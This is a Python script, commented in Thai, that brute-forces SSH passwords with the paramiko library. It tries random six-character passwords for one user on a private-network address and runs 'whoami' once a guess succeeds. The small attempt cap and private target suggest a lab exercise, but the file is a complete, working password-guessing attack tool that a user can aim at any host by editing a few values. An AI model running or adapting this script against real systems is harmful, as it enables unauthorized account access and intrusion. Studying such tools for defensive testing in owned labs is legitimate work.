import paramiko
import random
import string
import time
import socket

# --- ตั้งค่าเป้าหมาย ---
TARGET_IP = '192.168.122.109'
TARGET_PORT = 22
USERNAME = 'fruitto'
MAX_ATTEMPTS = 20  # จำนวนครั้งที่จะลองสุ่ม (ตั้งน้อยๆ ไว้ก่อนเพื่อทดสอบ)

# ฟังก์ชันสุ่มรหัสผ่าน
def generate_random_password(length=8):
    # รวมตัวอักษร a-z, A-Z และตัวเลข 0-9
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def ssh_brute_force():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    print(f"[*] Starting Brute Force on {USERNAME}@{TARGET_IP}...")

    for i in range(1, MAX_ATTEMPTS + 1):
        # สุ่มรหัสผ่านใหม่ทุกรอบ
        password_guess = generate_random_password(length=6)

        try:
            print(f"[{i}/{MAX_ATTEMPTS}] Trying password: {password_guess}", end='\r')

            # พยายามเชื่อมต่อ
            client.connect(hostname=TARGET_IP, port=TARGET_PORT, username=USERNAME, password=password_guess, timeout=3)

            # ถ้าบรรทัดนี้ทำงานได้ แสดงว่ารหัสถูก!
            print(f"\n[+] SUCCESS! Password found: {password_guess}")

            # ลองรันคำสั่งยืนยัน
            stdin, stdout, stderr = client.exec_command('whoami')
            print(f"Logged in as: {stdout.read().decode().strip()}")
            break # จบลูปทันทีที่เจอ

        except paramiko.AuthenticationException:
            # รหัสผิด (เคสปกติของการ brute force)
            # print(f"[-] Failed: {password_guess}") # เปิดบรรทัดนี้ถ้าอยากเห็น log ทุกบรรทัด
            pass

        except socket.error:
            print("\n[!] Connection Error (Server might be down or blocking)")
            break

        except Exception as e:
            print(f"\n[!] Error: {e}")
            break

        finally:
            client.close()
            # หน่วงเวลานิดนึง เพื่อไม่ให้เครื่องตัวเองค้าง หรือ Server พัง
            time.sleep(0.5)

    print("\n[*] Test Finished.")

if __name__ == "__main__":
    ssh_brute_force()